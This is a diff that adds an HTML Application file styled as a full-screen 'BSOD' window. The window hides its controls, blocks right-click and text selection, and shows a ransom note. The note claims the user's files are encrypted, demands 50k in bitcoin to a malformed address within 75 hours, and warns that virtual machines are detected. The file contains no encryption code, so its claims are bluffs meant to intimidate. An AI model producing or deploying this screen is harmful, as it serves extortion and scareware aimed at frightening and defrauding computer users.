@@ -1,0 +1,29 @@
+<html><head><title>BSOD</title> 
+ 
+<hta:application 
+applicationname="BSOD"  
+version="1.0" 
+maximizebutton="no" 
+minimizebutton="no" 
+sysmenu="no" 
+Caption="no" 
+windowstate="maximize"/> 
+ 
+</head><body bgcolor="#000000" scroll="no" style="border:0;cursor:default;" border="0" oncontextmenu="return false" onselectstart="return false"> 
+<font face="Lucida Console" size="4" color="#FFFFFF"> 
+<p>Whoops!</p> 
+
+<p>your files have been encrypted! </p> 
+ 
+<p>what how do i get them back?</p> 
+
+<p>the only way to decrypt and return files is to send 50k worth of bitcoin to this adress: 12367984gugjbk7gyu29489y4r(f) then when we get it we will decrypt the return them</p> 
+
+<p> you only have 75h 00m 00s left before we delete the encrypted files, dont play any pranks!</p>
+
+<p> this program will detect any virtual machine and leak to main pc, so dont try it! </p>
+
+<p>myid: 0000 0234 2637 8754 4754 8475 2453</p>
+ 
+</font> 
+</body></html> 
